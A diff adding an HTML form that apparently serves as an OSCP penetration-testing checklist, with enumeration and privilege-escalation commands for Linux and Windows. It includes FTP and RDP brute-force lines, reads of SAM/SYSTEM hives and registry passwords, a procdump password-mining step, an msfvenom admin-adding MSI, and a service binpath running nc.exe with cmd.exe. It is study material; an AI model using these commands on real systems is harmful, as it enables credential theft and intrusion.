@@ -1,0 +1,860 @@
+<!--
+Just a simple JS powered form for use in penetration testing
+
+More aimed towards the OSCP exam, meaning there are some areas not included (e.g. alot of network information gathering)
+
+1. Ask questions based on NMAP results
+	Is there a web server?
+	Is there some form of file server?
+		smb|tftp|ftp
+	RPCBind?
+	SQL Server?
+	RDP?
+	Operating System?
+
+ADD SMTP TO OPTS
+
+ADD LOGIC TO FORM PROMPTS
+
+web app form:
+show para corresponding to web server
+show para corresponding to web app framework
+
+
+
+-->
+
+<html>
+
+	<head>
+		<meta charset="utf-8">
+		<title>C-Cracks Notes Form</title>
+	</head>
+
+	<body>
+		<form name="form1" id="form1">
+			<h6>OS</h6>
+			<select name="OS" id="OS">
+
+				<option value="Linux" name="linux" id="linux">Linux</option>
+
+				<option id="windows" name="windows" value="Windows">Windows</option>
+
+			</select>
+
+			<h6>Other</h6>
+
+				<input type="checkbox" id="web-s" name="web-s" value="Web Server">
+				<label for="web-s">Web Server</label><br>
+
+				<input type="checkbox" id="file-s" name="file-s" value="File Server">
+				<label for="file-s">File Server</label><br>
+
+				<input type="checkbox" id="rpcbind" name="rpcbind" value="RPCBind">
+				<label for="rpcbind">RPCBind</label><br> 
+
+				<input type="checkbox" id="sql-s" name="sql-s" value="SQL Server">
+				<label for="sql-s">SQL Server</label><br> 
+
+				<input type="checkbox" id="rdp" name="rdp" value="RDP">
+				<label for="rdp">RDP</label><br> 
+
+				<input type="checkbox" id="smtp" name="smtp" value="SMTP">
+				<label for="smtp">SMTP</label><br> 
+
+			<button type="button" name="form1-sub" id="form1-sub">Click Me!</button> 
+
+		</form>
+
+		<form id="web-f" name="web-f" style="display:none;">
+
+			<div id="software_q">
+
+				<input type="text" name="ws_used" id="ws_used">
+				<label for="ws_used">Web Server Software And Version</label>
+
+				<p id="apache" style="display:none;">
+					Check for files with txt, html, php. pl, sh and cgi extensions.
+					If sh, cgi or pl found, is the server vulnerable to ShellShock? 
+				</p>
+
+				<p id="iis" style="display:none;">
+					Check for files with txt, html, asp, aspx and jsp extensions.
+				</p>
+
+				<p id="gunicorn" style="display:none;">
+					Check for files with txt, html and py.
+				</p>
+
+				<textarea name="ws_used_searchsp" id="ws_used_searchsp" rows="6" cols="50"></textarea>
+				<label for="ws_used_searchsp">SearchSploit - Web Server Software And Version</label>
+
+			</div>
+
+			<div id="dir_q">
+
+				<textarea name="ws_dirs" id="ws_dirs" rows="6" cols="50"></textarea>
+				<label for="ws_dirs">Discovered Directories</label>
+
+				<p>Check results from enum.sh and run DirBuster.</p>
+
+				<textarea name="ws_logins" id="ws_logins" rows="6" cols="50"></textarea>
+				<label for="ws_dirs">Discovered Login Portals</label>
+
+			</div>
+
+			<div id="web_arch_q">
+
+				<textarea name="ws_arch" id="ws_arch" rows="3" cols="50"></textarea>
+				<label for="ws_arch">Web App Architecture</label>
+
+				<textarea name="ws_arch_searchsp" id="ws_arch_searchsp" rows="6" cols="50"></textarea>
+				<label for="ws_arch">SearchSploit - Web App Architecture</label>
+
+				<p id="coldf" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/ColdFusion">Click here</a>
+				</p>
+
+				<p id="webdav" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/WEBDAV">Click here</a>		
+				</p>
+
+				<p id="apphp" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/ApPHP-&-XSS">Click here</a>
+				</p>
+
+				<p id="adv_comm_sys" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/advanced-comment-system">Click here</a>
+				</p>
+
+				<p id="HFS" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/HFS">Click here</a>					
+				</p>
+
+				<p id="miniserv" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/MiniServ">Click here</a>
+				</p>
+
+				<p id="tomcat" style="display:none;">
+					<a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">Default Credentials</a>
+				</p>
+
+				<p id="otrs" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/OTRS">Click here</a>
+				</p>
+
+				<p id="webmin" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/webmin">Click here</a>
+				</p>
+
+				<p id="phpliteadmin" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/PHPLiteAdmin">Click here</a>
+				</p>
+
+				<p id="simple_txt_login" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/Simple-Text-File-Login">Click here</a>
+				</p>
+
+				<p id="cuppa" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/Cuppa-CMS">Click here</a>
+				</p>
+
+				<p id="frontpage_sp" style="display:none;">
+					<a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/web-apps/FrontPage-SharePoint">Click here</a>
+				</p>
+
+				<p>
+					Check <a href="https://github.com/C-Cracks/OSCP-Automation/tree/master/web-apps">C-Cracks repo</a> for other info:<br>
+						Ovidentia|jQuery File Upload|Apache JServ|SQL Injection|LFI & RFI
+				</p>
+
+			</div>
+
+			<div id="ws_other">
+				
+				<textarea name="ws_oth" id="ws_oth" rows="9" cols="50"></textarea>
+				<label for="ws_oth">General Notes</label>
+
+			</div>
+
+			<div id="files-for-lfi">
+				<h6>Files When LFI Is Discovered</h6>
+				<p id="win-files">
+					<a href="https://github.com/infosec-au/fuzzdb/blob/master/attack-payloads/lfi/common-windows-files.txt">Some Here</a>
+
+					<a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">More Here</a>
+				</p>
+
+				<p id="lin-files">
+					<a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/">Alot Here</a>
+				</p>
+			</div>
+
+		</form>
+
+		<form id="file-f" name="file-f" style="display:none;">
+
+			<p>nmap --script=ftp-brute --script-args userdb=./users,passdb=./passes {IP} -p{port}</p>
+
+			<div id="ftp-anon">
+
+				<h6>Anonymous Login Allowed?</h6>
+				<select name="anon" id="anon">
+
+					<option value="anon-y" name="anon-y" id="anon-y">yes</option>
+
+					<option id="anon-n" name="anon-n" value="anon-n">no</option>
+
+				</select>
+
+			</div>
+
+			<div id="ftp_wr">
+
+				<h6>Write Access?</h6>
+				<select name="ftp-write" id="ftp-write">
+
+					<option value="ftp-write-y" name="ftp-write-y" id="ftp-write-y">yes</option>
+
+					<option id="ftp-write-n" name="ftp-write-n" value="ftp-write-n">no</option>
+
+				</select>
+
+			</div>
+
+			<div id="ftp_searchsp">
+
+				<textarea name="ftp-searchsp" id="ftp-searchsp" rows="6" cols="50"></textarea>
+				<label for="ftp-searchsp">SearchSploit - FTP Software & Version</label>
+
+			</div>
+
+			<div id="ftp_other">
+					
+				<textarea name="ftp_oth" id="ftp_oth" rows="9" cols="50"></textarea>
+				<label for="ftp_oth">General Notes</label>
+
+			</div>
+
+		</form>
+		<form id="rpcbind-f" name="rpcbind-f" style="display:none;">
+
+			<div id="rpcb-nfs">
+
+				<h6>Is NFS Running?</h6>
+				<select name="rpcb-nfs-q" id="rpcb-nfs-q">
+
+					<option value="rpcb-nfs-y" name="rpcb-nfs-y" id="rpcb-nfs-y">yes</option>
+
+					<option id="rpcb-nfs-n" name="rpcb-nfs-n" value="rpcb-nfs-n">no</option>
+
+				</select>
+
+			</div>
+
+			<div id="rpcb-nfs-checks">
+
+				<p>nmap -sV -p 111 --script=rpcinfo {IP}</p>
+				<p>nmap -p 111 --script nfs* {IP}</p>
+				<p>sudo mount -o nolock{IP}:{discovered share} {place to mount}</p>
+
+				<textarea name="rpcb-nfs-ch" id="rpcb-nfs-ch" rows="6" cols="50"></textarea>
+				<label for="rpcb-nfs-ch">Notes</label>
+
+			</div>
+
+
+		</form>
+
+		<form id="sql-f" name="sql-f" style="display:none;">
+
+			<div id="sql-creds">
+
+				<h6>Anything With Default Creds?</h6>
+				<select name="sql-creds-q" id="sql-creds-q">
+
+					<option value="sql-creds-y" name="sql-creds-y" id="sql-creds-y">yes</option>
+
+					<option id="sql-creds-n" name="sql-creds-n" value="sql-creds-n">no</option>
+
+				</select>
+
+			</div>
+
+			<div id="sql_searchsp">
+
+				<textarea name="sql-searchsp" id="sql-searchsp" rows="6" cols="50"></textarea>
+				<label for="sql-searchsp">SearchSploit - SQL Software & Version</label>
+
+			</div>
+
+		</form>
+
+		<form id="rdp-f" name="rdp-f" style="display:none;">
+
+			<div id="rdp-user">
+
+				<h6>Any user sessions via RDP?</h6>
+				<p>xfreerdp /u:"" -sec-nla /v:{IP}</p>
+				<p>If username discovered:<br>crowbar -b rdp -s {IP}/32 -u admin -C ~/password-file.txt -n 1</p>
+				<select name="rdp_user" id="rdp_user">
+
+					<option value="rdp_user_y" name="rdp_user_y" id="rdp_user_y">yes</option>
+
+					<option id="rdp_user_n" name="rdp_user_n" value="rdp_user_n">no</option>
+
+				</select>
+
+			</div>
+
+			<div id="rdp_user_y">
+
+				<textarea name="rdp_user-y" id="rdp_user-y" rows="6" cols="50"></textarea>
+				<label for="rdp_user-y">Discovered usernames</label>
+
+			</div>
+
+		</form>
+
+		<form id="smtp-f" name="smtp-f" style="display:none;">
+
+			<h6>User Enumeration</h6>
+			<p>smtp-user-enum -M VRFY -u root -t {IP}</p>
+			<p>Check available flags:<br>smtp-user-enum -h</p>
+
+			<h6>Login & Check Mail (POP3)</h6>
+			<p>telnet example.com 110</p>
+			<p>user username@example.com</p>
+			<p>pass yourpasswordgoeshere</p>
+			<p>list</p>
+			<p>To read:<br>retr 2</p>
+
+			<div id="smtp-notes">
+
+				<textarea name="smtp_notes" id="smtp_notes" rows="6" cols="50"></textarea>
+				<label for="smtp_notes">Notes</label>
+
+			</div>
+
+			<div id="smtp_searchsp">
+
+				<textarea name="smtp-searchsp" id="smtp-searchsp" rows="6" cols="50"></textarea>
+				<label for="smtp-searchsp">SearchSploit - SQL Software & Version</label>
+
+			</div>
+
+		</form>
+
+		<button type="button" name="form2-sub" id="form2-sub" style="visibility:hidden;">Click Me!</button> 
+
+		<form id="linux-f" style="display:none;">
+
+			<div id="sysinfo_lin">
+
+				<h6>OS & kernel Version</h6>
+				<p>
+					cat /etc/issue<br>
+					uname -a
+				</p>
+
+				<textarea name="os_kern_v_notes" id="os_kern_v_notes" rows="6" cols="50"></textarea>
+				<label for="os_kern_v_notes">Notes</label>
+
+			</div>
+
+			<div id="sudo">
+
+				<h6>Sudo Rights To Anything?</h6>
+				<p>sudo -l</p>
+
+				<select name="sudo_q" id="sudo_q">
+
+					<option value="sudo_q_y" name="sudo_q_y" id="sudo_q_y">yes</option>
+
+					<option id="sudo_q_n" name="sudo_q_n" value="sudo_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="sudo_notes" id="sudo_notes" rows="6" cols="50"></textarea>
+				<label for="sudo_notes">Notes</label>
+
+			</div>
+
+			<div id="SUID">
+
+				<h6>Interesting SUID Files?</h6>
+				<p>echo -e "\e[31mFiles run as owner, not user:\e[0m" && find / -perm -u=s -type f 2>/dev/null</p>
+				
+				<select name="SUID_q" id="SUID_q">
+
+					<option value="SUID_q_y" name="SUID_q_y" id="SUID_q_y">yes</option>
+
+					<option id="SUID_q_n" name="SUID_q_n" value="SUID_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="SUID_notes" id="SUID_notes" rows="6" cols="50"></textarea>
+				<label for="SUID_notes">Notes</label>
+
+			</div>
+
+			<div id="SGID">
+
+				<h6>Interesting SGID Files?</h6>
+				<p>echo -e "\e[31mFiles run as owner, not user:\e[0m" && find / -perm -g=s -type f 2>/dev/null</p>
+				
+				<select name="SGID_q" id="SGID_q">
+
+					<option value="SGID_q_y" name="SGID_q_y" id="SGID_q_y">yes</option>
+
+					<option id="SGID_q_n" name="SGID_q_n" value="SGID_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="SGID_notes" id="SGID_notes" rows="6" cols="50"></textarea>
+				<label for="SGID_notes">Notes</label>
+
+			</div>
+
+			<div id="env_vars_lin">
+
+				<h6>Info In Environment Variables</h6>
+				<p>
+					cat /etc/profile<br>
+					cat /etc/bashrc<br>
+					cat ~/.bash_profile<br>
+					cat ~/.bashrc<br>
+					cat ~/.bash_logout<br>
+					env<br>
+					set<br>	
+				</p>
+
+				<textarea name="lin_env_v_notes" id="lin_env_v_notes" rows="6" cols="50"></textarea>
+				<label for="lin_env_v_notes">Notes</label>
+
+			</div>
+
+			<!-- If web server found -->
+
+			<div id="web_dir_lin">
+
+				<h6>Info In Web Directory</h6>
+				<p>
+					ls -al /var/www/html /srv/http /srv/www 	
+				</p>
+
+				<textarea name="web_dir_lin_notes" id="web_dir_lin_notes" rows="6" cols="50"></textarea>
+				<label for="web_dir_lin_notes">Notes</label>
+
+			</div>
+
+			<div id="world-w">
+
+				<h6>Interesting World Writeable Files?</h6>
+				<p>echo -e "\e[31mWorld writeable files:\e[0m" && find / -writable 2>/dev/null</p>
+				
+				<select name="world-w_q" id="world-w_q">
+
+					<option value="world-w_q_y" name="world-w_q_y" id="world-w_q_y">yes</option>
+
+					<option id="world-w_q_n" name="world-w_q_n" value="world-w_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="world-w_notes" id="world-w_notes" rows="6" cols="50"></textarea>
+				<label for="world-w_notes">Notes</label>
+
+			</div>
+
+			<div id="world-e">
+
+				<h6>Interesting World Executable Files?</h6>
+				<p>echo -e "\e[31mWorld executable files:\e[0m" && find / -perm -o x 2>/dev/null</p>
+				
+				<select name="world-e_q" id="world-e_q">
+
+					<option value="world-e_q_y" name="world-e_q_y" id="world-e_q_y">yes</option>
+
+					<option id="world-e_q_n" name="world-e_q_n" value="world-e_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="world-e_notes" id="world-e_notes" rows="6" cols="50"></textarea>
+				<label for="world-e_notes">Notes</label>
+
+			</div>
+
+			<div id="cronjobs">
+
+				<h6>Notable Cronjobs?</h6>
+				<p>crontab -l ; echo "Other cronjob information:" && ls -al /etc/cron*</p>
+				
+				<select name="cron_q" id="cron_q">
+
+					<option value="cron_q_y" name="cron_q_y" id="cron_q_y">yes</option>
+
+					<option id="cron_q_n" name="cron_q_n" value="cron_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="cron_q_notes" id="cron_q_notes" rows="6" cols="50"></textarea>
+				<label for="cron_q_notes">Notes</label>
+
+			</div>
+
+			<div id="root_processes">
+
+				<h6>Notable Root processes?</h6>
+				<p>if [[ $( ps aux | grep "root" )!="" ]]; then echo "Services running under root: " ; ps aux | grep "root" ; fi</p>
+				
+				<select name="root_processes_q" id="root_processes_q">
+
+					<option value="root_processes_q_y" name="root_processes_q_y" id="root_processes_q_y">yes</option>
+
+					<option id="root_processes_q_n" name="root_processes_q_n" value="root_processes_q_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="root_processes_q_notes" id="root_processes_q_notes" rows="6" cols="50"></textarea>
+				<label for="root_processes_q_notes">Notes</label>
+
+			</div>
+
+			<div id="other_users_lin">
+
+				<h6>Other Users</h6>
+				<p>
+					echo -e "\e[31mSystem users:\e[0m" && cat /etc/passwd | cut -d: -f1<br>
+					ls -al /home<br>
+					ls -al /home/*
+				</p>
+
+				<textarea name="web_dir_lin_notes" id="web_dir_lin_notes" rows="6" cols="50"></textarea>
+				<label for="web_dir_lin_notes">Notes</label>
+
+			</div>
+
+			<!-- If smtp is found -->
+
+			<div id="mail_lin">
+
+				<h6>Any Interesting Mail?</h6>
+				<p>echo -e "\e[31mMail directory\e[0m" && ls -al /var/mail</p>
+				
+				<select name="mail_lin_q" id="mail_lin_q">
+
+					<option value="mail_lin_y" name="mail_lin_y" id="mail_lin_y">yes</option>
+
+					<option id="mail_lin_n" name="mail_lin_n" value="mail_lin_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="mail_lin_notes" id="mail_lin_notes" rows="6" cols="50"></textarea>
+				<label for="mail_lin_notes">Notes</label>
+
+			</div>
+
+			<div id="local_svcs_lin">
+
+				<h6>Interesting Local Services?</h6>
+				<p>netstat -ano</p>
+				
+				<select name="local_svcs_lin_q" id="local_svcs_lin_q">
+
+					<option value="local_svcs_lin_y" name="local_svcs_lin_y" id="local_svcs_lin_y">yes</option>
+
+					<option id="local_svcs_lin_n" name="local_svcs_lin_n" value="local_svcs_lin_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="local_svcs_lin_notes" id="local_svcs_lin_notes" rows="6" cols="50"></textarea>
+				<label for="local_svcs_lin_notes">Notes</label>
+
+			</div>
+
+		</form>
+
+		<form id="win-f" style="display:none;">
+
+			<div id="sysinfo_win">
+				<h6>OS Version?</h6>
+				<p>systeminfo</p>
+
+				<textarea name="sysinfo_win_notes" id="sysinfo_win_notes" rows="6" cols="50"></textarea>
+				<label for="sysinfo_win_notes">Notes</label>
+			</div>
+
+			<div id="user_inf_win">
+
+				<h6>Useable Privileges|Groups?</h6>
+				<p>whoami /all</p>
+				<p>privs thhat can be exploited</p>
+
+				<h6>Other Users?</h6>
+				<p>net user</p>
+
+				<textarea name="user_inf_win_notes" id="user_inf_win_notes" rows="6" cols="50"></textarea>
+				<label for="user_inf_win_notes">Notes</label>
+
+			</div>
+
+			<div id="reg_creds">
+
+				<h6>Registries With Credentials</h6>
+				<p>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"<br>reg query "HKCU\Software\ORL\WinVNC3\Password"<br>reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s<br>reg query "HKCU\Software\TightVNC\Server"<br>reg query "HKCU\Software\OpenSSH\Agent\Key(s)"</p>
+
+				<p>If a SSH private key is found in \Agent\Keys, decrypt with <a href="https://github.com/ropnop/windows_sshagent_extract">this</a></p>
+
+				<select name="reg_creds_q" id="reg_creds_q">
+
+					<option value="reg_creds_y" name="reg_creds_y" id="reg_creds_y">yes</option>
+
+					<option id="reg_creds_n" name="reg_creds_n" value="reg_creds_n">no</option>
+
+				</select>
+
+
+				<h6>Search Entire Registry For "password"</h6>
+				<p>REG QUERY HKLM /F "password" /t REG_SZ /S /K<br>REG QUERY HKCU /F "password" /t REG_SZ /S /K<br>REG QUERY HKLM /F "password" /t REG_SZ /S /d<br>REG QUERY HKCU /F "password" /t REG_SZ /S /d</p>
+
+				<textarea name="reg_creds_notes" id="reg_creds_notes" rows="6" cols="50"></textarea>
+				<label for="reg_creds_notes">Notes</label>
+
+			</div>
+
+			<div id="cred_mgr">
+
+				<h6>Any Credentials In Credential Manager?</h6>
+				<p>cmdkey /list</p>
+				
+				<select name="cred_mgr_q" id="cred_mgr_q">
+
+					<option value="cred_mgr_y" name="cred_mgr_y" id="cred_mgr_y">yes</option>
+
+					<option id="cred_mgr_n" name="cred_mgr_n" value="cred_mgr_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<p><a href="https://github.com/C-Cracks/OSCP-Automation/blob/master/Windows/CredMan.ps1">CredMan.ps1</a><br>.\CredMan.ps1 -ShoCred -All</p>
+
+				<textarea name="cred_mgr_notes" id="cred_mgr_notes" rows="6" cols="50"></textarea>
+				<label for="cred_mgr_notes">Notes</label>
+
+			</div>
+
+			<!-- If web server found -->
+
+			<div id="web_dir_win">
+
+				<h6>Info In Web Directory</h6>
+				<p>dir /a \inetpub\wwwroot \htdocs<br>type \Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</p>
+
+				<textarea name="web_dir_win_notes" id="web_dir_win_notes" rows="6" cols="50"></textarea>
+				<label for="web_dir_win_notes">Notes</label>
+
+			</div>
+
+			<div id="files_win">
+
+				<h6>Any Access To Sensitive Files?</h6>
+
+				<p>type \windows\repair\SAM<br>type \windows\System32\config\RegBack\SAM<br>type \windows\System32\config\SAM<br>type \windows\repair\system<<br>type \windows\System32\config\SYSTEM<br>type \windows\System32\config\RegBack\system</p>
+
+				<select name="files_win_q" id="files_win_q">
+
+					<option value="files_win_y" name="files_win_y" id="files_win_y">yes</option>
+
+					<option id="files_win_n" name="files_win_n" value="files_win_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="web_dir_win_notes" id="web_dir_win_notes" rows="6" cols="50"></textarea>
+				<label for="web_dir_win_notes">Notes</label>
+
+			</div>
+			
+			<div id="powershell_hist">
+
+				<h6>Anything In PowerShell History?</h6>
+				<p>type C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</p>
+
+				<select name="powershell_hist_q" id="powershell_hist_q">
+
+					<option value="powershell_hist_y" name="powershell_hist_y" id="powershell_hist_y">yes</option>
+
+					<option id="powershell_hist_n" name="powershell_hist_n" value="powershell_hist_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="powershell_hist_notes" id="powershell_hist_notes" rows="6" cols="50"></textarea>
+				<label for="powershell_hist_notes">Notes</label>
+
+			</div>			
+
+			<div id="unquoted_svc_path">
+
+				<h6>Any Unquoted Service Paths?</h6>
+
+				<p>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """<br>sc qc {SERVICE NAME}<br>net stop {SERVICE}<br>net start {SERVICE}</p>
+
+				<select name="unquoted_svc_path_q" id="unquoted_svc_path_q">
+
+					<option value="unquoted_svc_path_y" name="unquoted_svc_path_y" id="unquoted_svc_path_y">yes</option>
+
+					<option id="unquoted_svc_path_n" name="unquoted_svc_path_n" value="unquoted_svc_path_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="unquoted_svc_path_notes" id="unquoted_svc_path_notes" rows="6" cols="50"></textarea>
+				<label for="unquoted_svc_path_notes">Notes</label>
+
+			</div>
+
+			<div id="msi_files">
+
+				<h6>Will msi Files Execute As System?</h6>
+
+				<p>Yes if equal to 1:<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+
+				<select name="msi_files_q" id="msi_files_q">
+
+					<option value="msi_files_y" name="msi_files_y" id="msi_files_y">yes</option>
+
+					<option id="msi_files_n" name="msi_files_n" value="msi_files_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<p>Generate msi:<br>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi<br><br>Install msi in background:<br>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi</p>
+
+				<textarea name="msi_files_notes" id="msi_files_notes" rows="6" cols="50"></textarea>
+				<label for="msi_files_notes">Notes</label>
+
+			</div>
+
+			<div id="appcmd">
+
+				<h6>Is AppCmd.exe Present?</h6>
+				<p>type \Windows\System32\inetsrv\appcmd.exe</p>
+
+				<select name="appcmd_q" id="appcmd_q">
+
+					<option value="appcmd_y" name="appcmd_y" id="appcmd_y">yes</option>
+
+					<option id="appcmd_n" name="appcmd_n" value="appcmd_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe">See here for commands to use</a>
+
+				<textarea name="appcmd_notes" id="appcmd_notes" rows="6" cols="50"></textarea>
+				<label for="appcmd_notes">Notes</label>
+
+			</div>
+
+			<div id="apps_win">
+
+				<h6>System Apps? Any Over-Privileged?</h6>
+				<p>dir /a "C:\Program Files" "C:\Program Files (x86)"<br>icacls/cacls "C:\Program Files\*" "C:\Program Files (x86)\*"<br>accesschk.exe -uwcqv "Authenticated Users" * /accepteula<br>If we have ability to configure service:<br>sc config {Service_Name} binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"</p>
+
+				<textarea name="apps_win_notes" id="apps_win_notes" rows="6" cols="50"></textarea>
+				<label for="apps_win_notes">Notes (SearchSploit Any Unique Apps Also!)</label>
+
+			</div>
+
+			<div id="dll_hijack">
+
+				<h6>Can We Perform DLL Hijack Due To An Over-Privileged %PATH% Folder?</h6>
+				<p>for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" |findstr /i ":\\ everyone authenticated users todos %username%" && echo. )<br>icacls/cacls "path1" "path2"</p>
+
+				<select name="dll_hijack_q" id="dll_hijack_q">
+
+					<option value="dll_hijack_y" name="dll_hijack_y" id="dll_hijack_y">yes</option>
+
+					<option id="dll_hijack_n" name="dll_hijack_n" value="dll_hijack_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="dll_hijack_notes" id="dll_hijack_notes" rows="6" cols="50"></textarea>
+				<label for="dll_hijack_notes">Notes</label>
+
+			</div>
+
+			<div id="local_svcs_win">
+
+				<h6>Interesting Local Services?</h6>
+				<p>netstat -abno</p>
+				
+				<select name="local_svcs_win_q" id="local_svcs_win_q">
+
+					<option value="local_svcs_win_y" name="local_svcs_win_y" id="local_svcs_win_y">yes</option>
+
+					<option id="local_svcs_win_n" name="local_svcs_win_n" value="local_svcs_win_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+
+				<textarea name="local_svcs_win_notes" id="local_svcs_win_notes" rows="6" cols="50"></textarea>
+				<label for="local_svcs_win_notes">Notes</label>
+
+			</div>
+
+			<div id="procdump">
+
+				<h6>Password Mining Possible?</h6>
+				<p>procdump.exe -accepteula -ma {process_name/pid} {out.dmp}<br>strings {out.dmp}<br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Download ProcDump here</a></p>
+				
+				<select name="procdump_q" id="procdump_q">
+
+					<option value="procdump_y" name="procdump_y" id="procdump_y">yes</option>
+
+					<option id="procdump_n" name="procdump_n" value="procdump_n">no</option>
+
+				</select>
+
+				<!-- If answer is yes -->
+				<textarea name="procdump_notes" id="procdump_notes" rows="6" cols="50"></textarea>
+				<label for="procdump_notes">Notes</label>
+
+			</div>
+
+		</form>
+
+		<div id="scripts">
+			<script src="logic.js"></script> 
+		</div>
+	</body>
+
+</html>
